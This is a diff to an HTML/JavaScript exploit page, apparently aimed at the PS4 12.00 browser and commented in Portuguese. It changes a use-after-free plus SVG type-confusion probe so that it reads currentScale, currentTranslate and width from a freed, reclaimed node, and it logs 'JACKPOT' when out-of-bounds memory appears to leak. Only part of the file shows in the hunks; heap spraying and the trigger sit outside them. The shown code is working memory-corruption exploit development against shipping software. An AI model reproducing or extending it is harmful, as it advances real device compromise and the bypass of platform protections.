@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Element Property Leak</title>
+<title>PS4 12.00 - Deep Memory SVG Probe</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → SVG/H1 Type Confusion → Property Leak</h2>
+<h2>UAF → SVG Deep Memory Offset Probe</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -61,7 +61,7 @@ function reclaim(size){
 }
 
 // ==========================
-// 💥 SVG CONFUSION (100% INALTERADO - Minificado)
+// 💥 SVG CONFUSION (100% INALTERADO)
 function inject(child){
     try{
         child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
@@ -72,50 +72,49 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 ELEMENT PROPERTY PROBE (O NOVO SCANNER)
+// 🔬 DEEP MEMORY PROBE (O NOVO LEAK)
 function domOverlapProbe(fsTarget){
-    log("---- PROPERTY LEAK PROBE ----");
+    log("---- DEEP SVG PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
         if(!n) return;
 
-        // Agora sabemos que ele é um Elemento (Tipo 1)
         if(n.nodeType === 1){
-            log("[!!!] ZOMBI DETECTADO: " + n.nodeName);
+            log("[!] Acessando Offsets Profundos do SVG...");
 
+            // 1. Tenta ler o currentScale (é um FLOAT no C++)
+            // Se ler fora do H1, vai retornar um número decimal maluco
             try {
-                // 1. Tenta vazar via ID
-                let leakId = n.id;
-                if(leakId && leakId.length > 0){
-                    log("[$$$] LEAK NO ID! Tamanho: " + leakId.length);
-                    log("[$$$] Preview: " + leakId.substring(0, 30));
+                let scale = n.currentScale;
+                log("[$$$] currentScale: " + scale);
+                
+                // Se não for 1 (que é o padrão do SVG), NÓS VAZAMOS MEMÓRIA!
+                if(scale !== 1 && scale !== 0) {
+                    log("[!!!] JACKPOT! VAZAMENTO DE MEMÓRIA VIZINHA!");
                 }
+            } catch(e) { log("[UAF] scale error"); }
 
-                // 2. Tenta vazar via ClassName
-                let leakClass = n.className;
-                // SVG tem um className especial (SVGAnimatedString), vamos pegar o baseVal
-                let classVal = leakClass.baseVal || leakClass; 
-                if(typeof classVal === 'string' && classVal.length > 0){
-                    log("[$$$] LEAK NO CLASSNAME! Tamanho: " + classVal.length);
-                    log("[$$$] Preview: " + classVal.substring(0, 30));
+            // 2. Tenta ler a posição (Translate)
+            try {
+                let tx = n.currentTranslate.x;
+                let ty = n.currentTranslate.y;
+                log("[$$$] Translate X/Y: " + tx + " / " + ty);
+                
+                if(tx !== 0 || ty !== 0) {
+                    log("[!!!] JACKPOT! VAZAMENTO DE TRANSLATE!");
                 }
+            } catch(e) { log("[UAF] translate error"); }
 
-                // 3. Verifica corrupção de Atributos gerais
-                if(n.attributes && n.attributes.length > 0){
-                    log("[?] Objeto tem " + n.attributes.length + " atributos fantasmas");
-                    // Tenta ler o nome do primeiro atributo (isso costuma vazar ponteiros C++)
-                    log("[?] Attr 0: " + n.attributes[0].name + " = " + n.attributes[0].value.substring(0, 20));
-                } else {
-                    log("[SCAN] Propriedades vazias (tentando de novo...)");
-                }
+            // 3. Tenta ler a base de tamanho
+            try {
+                let w = n.width.baseVal.value;
+                log("[$$$] Width: " + w);
+            } catch(e) { log("[UAF] width error"); }
 
-            }catch(e){
-                log("[UAF] Crash ao ler propriedades do SVG (Excelente sinal!)");
-            }
         }
     }catch(e){
-        log("[UAF] probe geral crash");
+        log("[UAF] Probe total crash");
     }
 }
 
@@ -151,7 +150,7 @@ function trigger(fsTarget){
 // ==========================
 // MAIN
 function runTest(){
-    log("[*] Iniciando Property Scanner...");
+    log("[*] Iniciando Deep Memory Leak...");
     
     window.heap_press = setupHeap(); 
 
